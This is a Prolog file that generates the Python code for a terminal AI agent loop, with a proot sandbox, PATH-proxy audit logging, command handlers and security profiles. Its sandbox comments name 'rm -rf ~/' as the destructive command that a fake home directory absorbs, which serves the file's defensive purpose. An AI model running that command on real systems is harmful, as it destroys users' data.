            \'if [ -n "${AGENT_LOOP_AUDIT_LOG:-}" ]; then\',
            f\'  printf \\\'{{"event":"path_proxy","command":"{cmd_name}","args":"%s","action":"allow"}}\\\\n\\\' "$*" >> "$AGENT_LOOP_AUDIT_LOG" 2>/dev/null || true\',
            \'fi\',
            \'\',
            \'exec "$REAL_BIN" "$@"\',
        ]
        return \'\\n\'.join(lines) + \'\\n\'').

py_fragment(security_proot_sandbox_module, '"""proot-based filesystem isolation layer.

Wraps subprocess commands in proot to provide filesystem isolation.
On Termux/Android, proot is available via ``pkg install proot``.

This is Layer 4 in the security model — the outermost execution
wrapper, sitting after PATH proxying (Layer 3.5).

When ``redirect_home`` is enabled, proot binds a temporary directory
over ``$HOME`` so that destructive commands (e.g. ``rm -rf ~/``) hit
the fake home instead of the real one.  The real home contents are
copied into the temp dir so commands see a realistic environment.
"""

import os
import shlex
import shutil
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class ProotConfig:
    """Configuration for proot sandboxing."""
    # Extra directories the agent is allowed to access (bind-mounted)
    allowed_dirs: list[str] = field(default_factory=list)
    # Read-only bind mounts
    readonly_binds: list[str] = field(default_factory=list)
    # Kill child processes on exit
    kill_on_exit: bool = True
    # Termux prefix (for binaries, libs, etc.)
    termux_prefix: str = \'/data/data/com.termux/files/usr\'
    # Extra proot flags passed verbatim
    extra_flags: list[str] = field(default_factory=list)
    # Redirect $HOME to a temp directory inside proot.
    # When set to a path, proot binds that path over $HOME so writes
    # to ~ hit the fake dir, not the real home.
    redirect_home: str | None = None
    # Dry-run mode: wrap_command returns the full proot invocation
    # string but _run() callers can inspect it instead of executing.
    # Useful for testing that the command WOULD be sandboxed correctly
    # without actually running destructive commands.
    dry_run: bool = False


class ProotSandbox:
    """Wraps commands in proot for filesystem isolation."""

    def __init__(self, working_dir: str, config: ProotConfig | None = None):
        self.working_dir = working_dir
        self.config = config or ProotConfig()
        self._proot_path: str | None = None
        self._available: bool | None = None

    def is_available(self) -> bool:
        """Check if proot is installed and usable."""
        if self._available is not None:
            return self._available
        self._proot_path = shutil.which(\'proot\')
        self._available = self._proot_path is not None
        return self._available

    def wrap_command(self, command: str) -> str:
        """Wrap a bash command to run inside proot.

        The wrapped command:
        - Binds the working directory (read-write)
        - Binds Termux usr prefix (for binaries, libs)
        - Binds /proc, /dev, /system (needed for many commands)
        - Binds any extra allowed_dirs from config
        - Sets working directory inside proot
        - Uses --kill-on-exit to prevent orphan processes

        Returns:
            Shell command string suitable for subprocess.run(shell=True).

        Raises:
            RuntimeError: If proot is not installed.
        """
        if not self.is_available():
            raise RuntimeError(
                "proot is not installed. Install with: pkg install proot"
            )

        parts = [self._proot_path]

        if self.config.kill_on_exit:
            parts.append(\'--kill-on-exit\')

        # Working directory inside proot
        parts.extend([\'-w\', self.working_dir])

        # Essential system binds (Termux/Android)
        essential = [
            self.config.termux_prefix,  # bins, libs, etc.
            \'/proc\',
            \'/dev\',
            \'/system\',                  # Android linker
        ]
        for bind in essential:
            if os.path.exists(bind):
                parts.extend([\'-b\', bind])

        # Working directory (read-write)
        parts.extend([\'-b\', self.working_dir])

        # Redirect $HOME to a fake directory so destructive commands
        # (rm -rf ~/, etc.) hit the copy, not the real home.
        if self.config.redirect_home:
            real_home = os.path.expanduser(\'~\')
            parts.extend([\'-b\', f\'{self.config.redirect_home}:{real_home}\'])

        # User-configured allowed directories
        for dir_path in self.config.allowed_dirs:
            expanded = os.path.expanduser(dir_path)
            if os.path.exists(expanded):
                parts.extend([\'-b\', expanded])

        # Read-only binds
        for dir_path in self.config.readonly_binds:
            expanded = os.path.expanduser(dir_path)
            if os.path.exists(expanded):
                parts.extend([\'-b\', expanded])

        # Extra flags
        parts.extend(self.config.extra_flags)

        # The command to execute inside proot
        bash_path = os.path.join(self.config.termux_prefix, \'bin\', \'bash\')
        parts.extend([bash_path, \'-c\', command])

        return self._quote_parts(parts)

    def describe_command(self, command: str) -> dict:
        """Return a description of what wrap_command would produce.

        Useful for dry-run / inspection without executing anything.
        Returns a dict with \'proot_args\', \'inner_command\', \'binds\',
        and \'redirect_home\' so callers can verify the sandbox config.
        """
        if not self.is_available():
            return {\'error\': \'proot not available\'}

        real_home = os.path.expanduser(\'~\')
        binds = []
        # Essential
        for bind in [self.config.termux_prefix, \'/proc\', \'/dev\', \'/system\']:
            if os.path.exists(bind):
                binds.append(bind)
        binds.append(self.working_dir)
        # Home redirect
        home_redirect = None
        if self.config.redirect_home:
            home_redirect = f\'{self.config.redirect_home}:{real_home}\'
            binds.append(home_redirect)
        # Allowed dirs
        for d in self.config.allowed_dirs:
            expanded = os.path.expanduser(d)
            if os.path.exists(expanded):
                binds.append(expanded)
        return {
            \'inner_command\': command,
            \'binds\': binds,
            \'redirect_home\': home_redirect,
            \'working_dir\': self.working_dir,
            \'kill_on_exit\': self.config.kill_on_exit,
            \'dry_run\': self.config.dry_run,
        }

    def build_env_overrides(self) -> dict[str, str]:
        """Return env vars needed for proot execution.

        These should be merged into the subprocess env dict.
        """
        return {
            # Required on many Android kernels to avoid seccomp errors
            \'PROOT_NO_SECCOMP\': \'1\',
            # Disable termux-exec path remapping inside proot
            \'LD_PRELOAD\': \'\',
        }

    def status(self) -> dict:
        """Return diagnostic info."""
        return {
            \'available\': self.is_available(),
            \'proot_path\': self._proot_path,
            \'working_dir\': self.working_dir,
            \'allowed_dirs\': self.config.allowed_dirs,
            \'kill_on_exit\': self.config.kill_on_exit,
        }

    # ── Internal ──────────────────────────────────────────────────────────

    @staticmethod
    def _quote_parts(parts: list[str]) -> str:
        """Quote command parts for shell execution.

        Everything except the inner command (after ``-c``) gets normal
        shell quoting.  The inner command needs single-quote escaping.
        """
        if len(parts) >= 3 and parts[-2] == \'-c\':
            prefix = parts[:-1]
            inner = parts[-1]
            quoted_prefix = \' \'.join(shlex.quote(p) for p in prefix)
            escaped_inner = inner.replace("\'", "\'\\\\\'\'")
            return f"{quoted_prefix} \'{escaped_inner}\'"
        return \' \'.join(shlex.quote(p) for p in parts)').

py_fragment(agent_loop_imports, '#!/usr/bin/env python3
"""
UnifyWeaver Agent Loop - Append-Only Mode

A simple agent loop that works in any terminal environment.
Uses pure text output with no cursor control or escape codes.
"""

import json
import sys
import argparse
from pathlib import Path
from backends import AgentBackend, CoroBackend
from context import ContextManager, ContextBehavior, ContextFormat
from tools import ToolHandler, SecurityConfig
from config import (load_config, load_config_from_dir, get_default_config,
                     AgentConfig, Config, save_example_config,
                     resolve_api_key, read_config_cascade)
from security.audit import AuditLogger
from sessions import SessionManager
from skills import SkillsLoader
from costs import CostTracker
from export import ConversationExporter
from search import SessionSearcher
from aliases import AliasManager
from templates import TemplateManager
from history import HistoryManager
from multiline import get_input_smart
from display import DisplayMode, Spinner
').

py_fragment(agent_loop_class_init, 'class AgentLoop:
    """Main agent loop orchestrating all components."""

    def __init__(
        self,
        backend: AgentBackend,
        context: ContextManager | None = None,
        tools: ToolHandler | None = None,
        show_tokens: bool = True,
        auto_execute_tools: bool = False,
        max_iterations: int = 0,
        config: Config | None = None,
        session_manager: SessionManager | None = None,
        session_id: str | None = None,
        track_costs: bool = True,
        streaming: bool = False,
        display_mode: str = \'append\'
    ):
        self.backend = backend
        self.context = context if context is not None else ContextManager()
        self.tools = tools or ToolHandler()
        self.show_tokens = show_tokens
        self.auto_execute_tools = auto_execute_tools
        self.max_iterations = max_iterations  # 0 = unlimited
        self.config = config  # For backend switching
        self.session_manager = session_manager or SessionManager()
        self.session_id = session_id  # Current session ID if loaded/saved
        self.cost_tracker = CostTracker() if track_costs else None
        self.streaming = streaming
        self.display_mode = display_mode  # \'append\' or \'ncurses\'
        self.alias_manager = AliasManager()
        self.template_manager = TemplateManager()
        self.history_manager = HistoryManager(self.context)
        self.running = True

    def run(self) -> None:
        """Main loop - read input, get response, display output."""
        self._print_header()

        while self.running:
            try:
                # Get user input
                user_input = self._get_input()

                if user_input is None:
                    # EOF
                    break

                if not user_input.strip():
                    continue

                # Handle commands
                if self._handle_command(user_input):
                    continue

                # Handle template invocation (@template_name ...)
                if user_input.strip().startswith(\'@\'):
                    name, kwargs = self.template_manager.parse_template_invocation(user_input.strip())
                    if name:
                        template = self.template_manager.get(name)
                        missing = template.missing_variables(**kwargs)
                        if missing:
                            print(f"[Template @{name} requires: {\', \'.join(missing)}]\\n")
                            continue
                        user_input = template.render(**kwargs)
                        print(f"[Using template @{name}]")

                # Process the message
                self._process_message(user_input)

            except KeyboardInterrupt:
                print("\\n\\nInterrupted. Type \'exit\' to quit.")
            except Exception as e:
                print(f"\\n[Error: {e}]\\n")

        print("\\nGoodbye!")

    def _print_header(self) -> None:
        """Print the startup header."""
        print("UnifyWeaver Agent Loop")
        print(f"Backend: {self.backend.name}")
        iterations_str = "unlimited" if self.max_iterations == 0 else str(self.max_iterations)
        print(f"Max iterations: {iterations_str}")
        print("Type \'exit\' to quit, \'/help\' for commands")
        print()

    def _get_input(self) -> str | None:
        """Get input from user with multi-line support."""
        return get_input_smart("You: ")
').

%% Per-handler command fragments — split from agent_loop_command_handlers
%% Emitted in slash_command_dispatch_order by emit_handler_fragments/2

py_fragment(handler_iterations_command, '    def _handle_iterations_command(self, text: str) -> bool:
        """Handle /iterations N command."""
        parts = text.split(None, 1)
        if len(parts) < 2:
            iterations_str = "unlimited" if self.max_iterations == 0 else str(self.max_iterations)
            print(f"[Current max iterations: {iterations_str}]")
            print("[Usage: /iterations N (0 = unlimited)]\\n")
            return True

        try:
            n = int(parts[1])
            if n < 0:
                raise ValueError("Must be >= 0")
            self.max_iterations = n
            iterations_str = "unlimited" if n == 0 else str(n)
            print(f"[Max iterations set to: {iterations_str}]\\n")
        except ValueError as e:
            print(f"[Error: Invalid number - {e}]\\n")
        return True').

py_fragment(handler_backend_command, '    def _handle_backend_command(self, text: str) -> bool:
        """Handle /backend <name> command."""
        parts = text.split(None, 1)
        if len(parts) < 2:
            print(f"[Current backend: {self.backend.name}]")
            if self.config:
                print(f"[Available: {\', \'.join(self.config.agents.keys())}]")
            print("[Usage: /backend <agent-name>]\\n")
            return True

        agent_name = parts[1].strip()

        if not self.config:
            print("[Error: No config loaded, cannot switch backends]\\n")
            return True

        if agent_name not in self.config.agents:
            print(f"[Error: Unknown agent \'{agent_name}\']")
            print(f"[Available: {\', \'.join(self.config.agents.keys())}]\\n")
            return True

        try:
            agent_config = self.config.agents[agent_name]
            self.backend = create_backend_from_config(agent_config)
            print(f"[Switched to backend: {self.backend.name}]\\n")
        except Exception as e:
            print(f"[Error switching backend: {e}]\\n")
        return True').

py_fragment(handler_save_command, '    def _handle_save_command(self, text: str) -> bool:
        """Handle /save [name] command."""
        parts = text.split(None, 1)
        name = parts[1].strip() if len(parts) > 1 else None

        try:
            self.session_id = self.session_manager.save_session(
                context=self.context,
                session_id=self.session_id,
                name=name,
                backend_name=self.backend.name
            )
            print(f"[Session saved: {self.session_id}]\\n")
        except Exception as e:
            print(f"[Error saving session: {e}]\\n")
        return True').

py_fragment(handler_load_command, '    def _handle_load_command(self, text: str) -> bool:
        """Handle /load <session_id> command."""
        parts = text.split(None, 1)
        if len(parts) < 2:
            print("[Usage: /load <session_id>]")
            print("[Use /sessions to list available sessions]\\n")
            return True

        session_id = parts[1].strip()

        try:
            context, metadata, extra = self.session_manager.load_session(session_id)
            self.context = context
            self.session_id = session_id
            print(f"[Session loaded: {metadata.get(\'name\', session_id)}]")
            print(f"[Messages: {context.message_count}, Tokens: {context.token_count}]\\n")
        except FileNotFoundError:
            print(f"[Session not found: {session_id}]\\n")
        except Exception as e:
            print(f"[Error loading session: {e}]\\n")
        return True').

py_fragment(handler_sessions_command, '    def _handle_sessions_command(self) -> bool:
        """Handle /sessions command."""
        sessions = self.session_manager.list_sessions()
        if not sessions:
            print("[No saved sessions]\\n")
            return True

        print("Saved sessions:")
        for s in sessions[:10]:  # Show last 10
            print(f"  {s.id}: {s.name} ({s.message_count} msgs, {s.backend})")
        if len(sessions) > 10:
            print(f"  ... and {len(sessions) - 10} more")
        print()
        return True').

py_fragment(handler_format_command, '    def _handle_format_command(self, text: str) -> bool:
        """Handle /format [type] command."""
        parts = text.split(None, 1)
        if len(parts) < 2:
            print(f"[Current format: {self.context.format.value}]")
            print("[Available: plain, markdown, json, xml]\\n")
            return True

        format_name = parts[1].strip().lower()
        try:
            self.context.format = ContextFormat(format_name)
            print(f"[Context format set to: {format_name}]\\n")
        except ValueError:
            print(f"[Unknown format: {format_name}]")
            print("[Available: plain, markdown, json, xml]\\n")
        return True').

py_fragment(handler_export_command, '    def _handle_export_command(self, text: str) -> bool:
        """Handle /export <path> command."""
        parts = text.split(None, 1)
        if len(parts) < 2:
            print("[Usage: /export <path>]")
            print("[Formats: .md, .html, .json, .txt (auto-detected from extension)]\\n")
            return True

        path = parts[1].strip()
        try:
            exporter = ConversationExporter(self.context)
            exporter.save(path, title=self.session_id or "Conversation")
            print(f"[Exported to: {path}]\\n")
        except Exception as e:
            print(f"[Error exporting: {e}]\\n")
        return True').

py_fragment(handler_cost_command, '    def _handle_cost_command(self) -> bool:
        """Handle /cost command."""
        if not self.cost_tracker:
            print("[Cost tracking disabled]\\n")
            return True

        summary = self.cost_tracker.get_summary()
        print(f"""
Cost Summary:
  Requests: {summary[\'total_requests\']}
  Input tokens: {summary[\'total_input_tokens\']:,}
  Output tokens: {summary[\'total_output_tokens\']:,}
  Total tokens: {summary[\'total_tokens\']:,}
  Estimated cost: {summary[\'cost_formatted\']}
""")
        return True').

py_fragment(handler_search_command, '    def _handle_search_command(self, text: str) -> bool:
        """Handle /search <query> command."""
        parts = text.split(None, 1)
        if len(parts) < 2:
            print("[Usage: /search <query>]\\n")
            return True

        query = parts[1].strip()
        try:
            searcher = SessionSearcher(self.session_manager.sessions_dir)
            results = searcher.search(query, limit=10)

            if not results:
                print(f"[No results for: {query}]\\n")
                return True

            print(f"Search results for \'{query}\':")
            for r in results:
                role = "You" if r.role == "user" else "Asst"
                snippet = r.content[r.match_start:r.match_end]
                context = r.context_before[-20:] + "**" + snippet + "**" + r.context_after[:20]
                print(f"  [{r.session_id}] {role}: ...{context}...")
            print()
        except Exception as e:
            print(f"[Search error: {e}]\\n")
        return True').

py_fragment(handler_stream_command, '    def _handle_stream_command(self) -> bool:
        """Handle /stream command to toggle streaming mode."""
        if not self.backend.supports_streaming():
            print(f"[Backend {self.backend.name} does not support streaming]\\n")
            return True

        self.streaming = not self.streaming
        status = "enabled" if self.streaming else "disabled"
        print(f"[Streaming {status}]\\n")
        return True').

py_fragment(handler_aliases_command, '    def _handle_aliases_command(self) -> bool:
        """Handle /aliases command."""
        print(self.alias_manager.format_list())
        print()
        return True').

py_fragment(handler_templates_command, '    def _handle_templates_command(self) -> bool:
        """Handle /templates command."""
        print(self.template_manager.format_list())
        print()
        return True').

py_fragment(handler_history_command, '    def _handle_history_command(self, text: str) -> bool:
        """Handle /history [n] command."""
        parts = text.split()
        limit = 10
        if len(parts) > 1:
            try:
                limit = int(parts[1])
            except ValueError:
                pass
        print(self.history_manager.format_history(limit))
        print()
        return True').

py_fragment(handler_undo_command, '    def _handle_undo_command(self) -> bool:
        """Handle /undo command."""
        if self.history_manager.undo():
            print("[Undo successful]\\n")
        else:
            print("[Nothing to undo]\\n")
        return True').

py_fragment(handler_delete_command, '    def _handle_delete_command(self, text: str) -> bool:
        """Handle /delete <n> or /delete <start>-<end> command."""
        parts = text.split(None, 1)
        if len(parts) < 2:
            print("[Usage: /delete <index> or /delete <start>-<end> or /delete last [n]]\\n")
            return True

        arg = parts[1].strip()

        # Handle \'last [n]\'
        if arg.startswith(\'last\'):
            n = 1
            sub_parts = arg.split()
            if len(sub_parts) > 1:
                try:
                    n = int(sub_parts[1])
                except ValueError:
                    pass
            count = self.history_manager.delete_last(n)
            print(f"[Deleted {count} message(s)]\\n")
            return True

        # Handle range \'start-end\'
        if \'-\' in arg:
            try:
                start, end = arg.split(\'-\', 1)
                start = int(start)
                end = int(end)
                count = self.history_manager.delete_range(start, end)
                print(f"[Deleted {count} message(s)]\\n")
            except ValueError:
                print("[Invalid range format]\\n")
            return True

        # Handle single index
        try:
            index = int(arg)
            if self.history_manager.delete_message(index):
                print(f"[Deleted message {index}]\\n")
            else:
                print(f"[Invalid index: {index}]\\n")
        except ValueError:
            print("[Invalid index]\\n")
        return True').

py_fragment(handler_edit_command, '    def _handle_edit_command(self, text: str) -> bool:
        """Handle /edit <index> command."""
        parts = text.split(None, 1)
        if len(parts) < 2:
            print("[Usage: /edit <index>]\\n")
            return True

        try:
            index = int(parts[1].strip())
        except ValueError:
            print("[Invalid index]\\n")
            return True

        # Get current content
        content = self.history_manager.get_full_content(index)
        if content is None:
            print(f"[Invalid index: {index}]\\n")
            return True

        print(f"Current content of message {index}:")
        print(content[:200] + "..." if len(content) > 200 else content)
        print("\\nEnter new content (or empty to cancel):")

        try:
            new_content = get_input_smart("New: ")
            if new_content and new_content.strip():
                if self.history_manager.edit_message(index, new_content):
                    print(f"[Message {index} updated]\\n")
                else:
                    print("[Edit failed]\\n")
            else:
                print("[Edit cancelled]\\n")
        except EOFError:
            print("[Edit cancelled]\\n")
        return True').

py_fragment(handler_replay_command, '    def _handle_replay_command(self, text: str) -> bool:
        """Handle /replay <index> command to re-send a message."""
        parts = text.split(None, 1)
        if len(parts) < 2:
            print("[Usage: /replay <index>]\\n")
            return True

        try:
            index = int(parts[1].strip())
        except ValueError:
            print("[Invalid index]\\n")
            return True

        content = self.history_manager.replay_from(index)
        if content is None:
            print(f"[Cannot replay: message {index} not found or not a user message]\\n")
            return True

        print(f"[Replaying message {index}]")
        self._process_message(content)
        return True').

py_fragment(agent_loop_status_method, '    def _print_status(self) -> None:
        """Print context status."""
        iterations_str = "unlimited" if self.max_iterations == 0 else str(self.max_iterations)
        session_str = self.session_id or "(unsaved)"
        streaming_str = "on" if self.streaming else "off"
        cost_str = self.cost_tracker.format_status() if self.cost_tracker else "disabled"
        print(f"""
Status:
  Backend: {self.backend.name}
  Session: {session_str}
  Streaming: {streaming_str}
  Max iterations: {iterations_str}
  Context format: {self.context.format.value}
  Messages: {self.context.message_count}
  Context tokens: {self.context.token_count} (est.)
  Context chars: {self.context.char_count}
  Context words: {self.context.word_count}
  Cost: {cost_str}
""")
').

py_fragment(agent_loop_process_message, '    def _process_message(self, user_input: str) -> None:
        """Process a user message and get response."""
        # Add to context
        self.context.add_message(\'user\', user_input)

        # Show that we\'re calling the backend
        use_spinner = self.display_mode == \'ncurses\' and DisplayMode.supports_ncurses()
        spinner = None

        if use_spinner:
            spinner = Spinner("Calling backend...")
            spinner.start()
        else:
            print("\\n[Calling backend...]")

        # Status callback to update spinner with tool call info
        def on_status(status: str):
            if spinner:
                spinner.update(status)
            else:
                print(f"  {status}")

        # Get response from backend (with streaming if enabled)
        try:
            if self.streaming and self.backend.supports_streaming() and hasattr(self.backend, \'send_message_streaming\'):
                if spinner:
                    spinner.stop()
                    spinner = None
                print("\\nAssistant: ", end="", flush=True)
                response = self.backend.send_message_streaming(
                    user_input,
                    self.context.get_context(),
                    on_token=lambda t: print(t, end="", flush=True)
                )
                print()  # Newline after streaming
            else:
                response = self.backend.send_message(
                    user_input,
                    self.context.get_context(),
                    on_status=on_status
                )
        except KeyboardInterrupt:
            if spinner:
                spinner.stop()
            print("\\n[Interrupted]")
            return
        finally:
            if spinner:
                spinner.stop()

        # Handle tool calls if present
        iteration_count = 0
        prev_tool_sig = None  # Track previous tool calls to detect loops
        while response.tool_calls:
            iteration_count += 1

            # Detect duplicate tool calls (model stuck in a loop)
            current_sig = [
                (tc.name, json.dumps(tc.arguments, sort_keys=True))
                for tc in response.tool_calls
            ]
            if current_sig == prev_tool_sig:
                print("\\n[Stopped: model repeated the same tool call]")
                # Ask the model to respond with text instead of retrying
                self.context.add_message(
                    \'user\',
                    "The tool has already been executed and the result "
                    "was returned above. Please respond with your answer."
                )
                response = self.backend.send_message(
                    "",
                    self.context.get_context(),
                    on_status=on_status
                )
                break
            prev_tool_sig = current_sig

            # Check iteration limit
            if self.max_iterations > 0 and iteration_count > self.max_iterations:
                print(f"\\n[Paused after {self.max_iterations} iteration(s)]")
                print("[Press Enter to continue, or type a message]")
                try:
                    cont = input("You: ")
                    if cont.strip():
                        # User provided new input - process it instead
                        self.context.add_message(\'assistant\', response.content, 0)
                        self._process_message(cont)
                        return
                    # Reset counter and continue
                    iteration_count = 1
                except EOFError:
                    return

            # Record assistant message with its tool calls in context
            raw_tool_calls = []
            for tc in response.tool_calls:
                raw_tool_calls.append({
                    "id": tc.id,
                    "type": "function",
                    "function": {
                        "name": tc.name,
                        "arguments": json.dumps(tc.arguments),
                    }
                })
            self.context.add_message(
                \'assistant\', response.content or \'\',
                tool_calls=raw_tool_calls
            )

            for tool_call in response.tool_calls:
                # Execute the tool (with confirmation unless auto_execute)
                if self.auto_execute_tools:
                    # Skip confirmation
                    self.tools.confirm_destructive = False

                result = self.tools.execute(tool_call)

                # Show result to user
                print(f"  {result.output[:200]}{\'...\' if len(result.output) > 200 else \'\'}")

                # Record tool result with proper role
                self.context.add_message(
                    \'tool\',
                    self.tools.format_result_for_agent(result),
                    tool_call_id=tool_call.id
                )

            print(f"\\n[Iteration {iteration_count}: continuing with tool results...]")
            # Context now has assistant (with tool_calls) + tool results;
            # send empty message so backend just reads context
            response = self.backend.send_message(
                "",
                self.context.get_context(),
                on_status=on_status
            )

        # Display response (if not already streamed)
        if not (self.streaming and self.backend.supports_streaming() and hasattr(self.backend, \'send_message_streaming\')):
            print(f"\\nAssistant: {response.content}\\n")
        else:
            print()  # Just add spacing after streamed output

        # Add response to context
        output_tokens = response.tokens.get(\'output\', 0)
        input_tokens = response.tokens.get(\'input\', 0)
        self.context.add_message(\'assistant\', response.content, output_tokens)

        # Track costs
        if self.cost_tracker and response.tokens:
            model = getattr(self.backend, \'model\', \'unknown\')
            self.cost_tracker.ensure_pricing(model)
            self.cost_tracker.record_usage(model, input_tokens, output_tokens)

        # Show token summary if enabled
        if self.show_tokens and response.tokens:
            token_info = ", ".join(
                f"{k}: {v}" for k, v in response.tokens.items()
            )
            cost_info = ""
            if self.cost_tracker:
                cost_info = f" | Est. cost: {self.cost_tracker.get_summary()[\'cost_formatted\']}"
            print(f"  [Tokens: {token_info}{cost_info}]\\n")
').

py_fragment(agent_loop_helpers, 'def build_system_prompt(agent_config: AgentConfig, config_dir: str = "") -> str | None:
    """Build system prompt from config, agent.md, and skills."""
    loader = SkillsLoader(base_dir=config_dir or Path.cwd())

    return loader.build_system_prompt(
        base_prompt=agent_config.system_prompt,
        agent_md=agent_config.agent_md,
        skills=agent_config.skills if agent_config.skills else None
    ) or agent_config.system_prompt


def _resolve_command(backend_type: str, configured: str | None,
                     default: str, fallbacks: list[str] | None = None,
                     no_fallback: bool = False) -> str:
    """Resolve which command to use for a CLI backend.

    Checks if the configured/default command exists. If not, tries
    fallbacks (unless --no-fallback). Always prints what\'s being used.
    """
    import shutil

    # Explicit --command overrides everything, no fallback
    if configured:
        if shutil.which(configured):
            return configured
        raise ValueError(
            f"Command \'{configured}\' not found for {backend_type} backend"
        )

    # Try the default command
    if shutil.which(default):
        return default

    # Default not found — try fallbacks
    if not no_fallback and fallbacks:
        for fb in fallbacks:
            if shutil.which(fb):
                print(f"  Note: \'{default}\' not found, "
                      f"falling back to \'{fb}\' for {backend_type} backend",
                      file=sys.stderr)
                return fb

    # Nothing found
    if fallbacks and not no_fallback:
        tried = \', \'.join([default] + fallbacks)
        raise ValueError(
            f"No command found for {backend_type} backend (tried: {tried}). "
            f"Install one or use --command to specify."
        )
    else:
        raise ValueError(
            f"Command \'{default}\' not found for {backend_type} backend. "
            f"Install it or use --command to specify."
        )
').


py_fragment(agent_loop_main_body_pre_overrides, '    args = parser.parse_args()

    # Handle --init-config
    if args.init_config:
        path = Path(args.init_config)
        save_example_config(path)
        print(f"Created example config at: {path}")
        return

    # Load configuration
    config = None
    if args.config:
        config = load_config(args.config)
    else:
        config = load_config_from_dir()

    if config is None:
        config = get_default_config()

    # Create session manager
    session_manager = SessionManager(args.sessions_dir)

    # Handle --list-sessions
    if args.list_sessions:
        sessions = session_manager.list_sessions()
        if not sessions:
            print("No saved sessions")
            return
        print("Saved sessions:")
        for s in sessions:
            print(f"  {s.id}: {s.name} ({s.message_count} msgs, {s.backend})")
        return

    # Handle --search
    if args.search:
        searcher = SessionSearcher(session_manager.sessions_dir)
        results = searcher.search(args.search, limit=20)
        if not results:
            print(f"No results for: {args.search}")
            return
        print(f"Search results for \'{args.search}\':")
        for r in results:
            role = "You" if r.role == "user" else "Asst"
            snippet = r.content[r.match_start:r.match_end]
            context = r.context_before[-20:] + "**" + snippet + "**" + r.context_after[:20]
            print(f"  [{r.session_id}] {role}: ...{context}...")
        return

    # Handle --list-agents
    if args.list_agents:
        print("Available agents:")
        for name, agent in config.agents.items():
            default_marker = " (default)" if name == config.default else ""
            print(f"  {name}: {agent.backend} ({agent.model or \'default\'}){default_marker}")
        return

    # Get agent config
    agent_name = args.agent or config.default
    if agent_name not in config.agents:
        print(f"Unknown agent: {agent_name}", file=sys.stderr)
        print(f"Available: {\', \'.join(config.agents.keys())}", file=sys.stderr)
        sys.exit(1)

    agent_config = config.agents[agent_name]
').

py_fragment(agent_loop_main_body_post_overrides, '
    # Create backend
    try:
        backend = create_backend_from_config(
            agent_config, config.config_dir,
            sandbox=args.sandbox,
            approval_mode=args.approval_mode,
            allowed_tools=args.allowed_tools,
            no_fallback=args.no_fallback
        )
    except ImportError as e:
        print(f"Backend requires additional package: {e}", file=sys.stderr)
        sys.exit(1)
    except ValueError as e:
        print(f"Configuration error: {e}", file=sys.stderr)
        sys.exit(1)

    # Load session if specified
    session_id = None
    context = None

    if args.session:
        try:
            context, metadata, extra = session_manager.load_session(args.session)
            session_id = args.session
            print(f"Loaded session: {metadata.get(\'name\', session_id)}")
        except FileNotFoundError:
            print(f"Session not found: {args.session}", file=sys.stderr)
            sys.exit(1)

    # Create context manager if not loaded from session
    if context is None:
        behavior = ContextBehavior(agent_config.context_mode)
        context_format = ContextFormat(args.context_format) if args.context_format else ContextFormat.PLAIN
        context = ContextManager(
            behavior=behavior,
            max_tokens=args.max_tokens or agent_config.max_context_tokens,
            max_messages=agent_config.max_messages,
            max_chars=args.max_chars,
            max_words=args.max_words,
            format=context_format
        )

    # Create security config
    security_profile = \'cautious\'  # default
    if args.no_security:
        security_profile = \'open\'
    elif args.security_profile:
        security_profile = args.security_profile

    # Load security overrides from uwsal.json if present
    security_cfg = read_config_cascade(args.no_fallback).get(\'security\', {})
    if not args.security_profile and not args.no_security:
        security_profile = security_cfg.get(\'profile\', security_profile)

    security = SecurityConfig.from_profile(security_profile)
    # Apply config file overrides (extend blocklists/allowlists)
    for path in security_cfg.get(\'blocked_paths\', []):
        security.blocked_paths.append(path)
    for path in security_cfg.get(\'allowed_paths\', []):
        security.allowed_paths.append(path)
    for cmd in security_cfg.get(\'blocked_commands\', []):
        security.blocked_commands.append(cmd)
    for cmd in security_cfg.get(\'allowed_commands\', []):
        security.allowed_commands.append(cmd)

    # Apply optional execution layer flags (CLI + config)
    if args.path_proxy or security_cfg.get(\'path_proxying\'):
        security.path_proxying = True
    if args.proot or security_cfg.get(\'proot_sandbox\'):
        security.proot_sandbox = True
    for d in getattr(args, \'proot_allow_dir\', []):
        security.proot_allowed_dirs.append(d)
    for d in security_cfg.get(\'proot_allowed_dirs\', []):
        security.proot_allowed_dirs.append(d)
').

py_fragment(agent_loop_main_body_post_audit, '    audit_level = audit_levels.get(security_profile, \'basic\')
    audit_log_dir = security_cfg.get(\'audit_log_dir\')
    audit_logger = AuditLogger(log_dir=audit_log_dir, level=audit_level)

    # Create tool handler
    tools = None
    if agent_config.tools:
        tools = ToolHandler(
            allowed_tools=agent_config.tools,
            confirm_destructive=not agent_config.auto_tools,
            security=security,
            audit=audit_logger
        )

    # Start audit session
    import uuid as _uuid
    audit_session_id = session_id or str(_uuid.uuid4())[:8]
    audit_logger.start_session(
        audit_session_id,
        security_profile=security_profile
    )

    # Create and run loop
    loop = AgentLoop(
        backend=backend,
        context=context,
        tools=tools,
        show_tokens=agent_config.show_tokens and not args.no_tokens,
        auto_execute_tools=agent_config.auto_tools,
        max_iterations=agent_config.max_iterations,
        config=config,
        session_manager=session_manager,
        session_id=session_id,
        track_costs=not args.no_cost_tracking,
        streaming=args.stream,
        display_mode=\'ncurses\' if args.fancy else \'append\'
    )

    try:
        # Single prompt mode (run once and exit)
        if args.prompt:
            print(f"You: {args.prompt}")
            loop._process_message(args.prompt)
            return

        # Interactive mode with initial prompt (-i)
        if args.prompt_interactive:
            loop._print_header()
            print(f"\\nYou: {args.prompt_interactive}")
            loop._process_message(args.prompt_interactive)
            # Continue in interactive mode
            while loop.running:
                try:
                    user_input = loop._get_input()
                    if user_input is None:
                        break
                    if not user_input.strip():
                        continue
                    if loop._handle_command(user_input):
                        continue
                    loop._process_message(user_input)
                except KeyboardInterrupt:
                    print("\\n\\nInterrupted. Type \'exit\' to quit.")
                except Exception as e:
                    print(f"\\n[Error: {e}]\\n")
            print("\\nGoodbye!")
            return

        # Interactive mode
        loop.run()
    finally:
        audit_logger.end_session()


if __name__ == \'__main__\':
    main()').




%% Generator: Individual backends (full implementations)
%% =============================================================================

generate_backend(Name) :-
    agent_backend(Name, Props),
    resolve_file_name(Name, FileName),
    output_path(python, 'backends/', BackendsRoot),
    atom_concat(BackendsRoot, FileName, Path1),
    atom_concat(Path1, '.py', Path),
    open(Path, write, S),
    generate_backend_full(S, Name, Props),
    close(S),
    format('  Generated backends/~w.py~n', [FileName]).

%% --- Backend scaffold predicates (shared across all 8 backends) ---

%% Emit module header: docstring + imports + base import
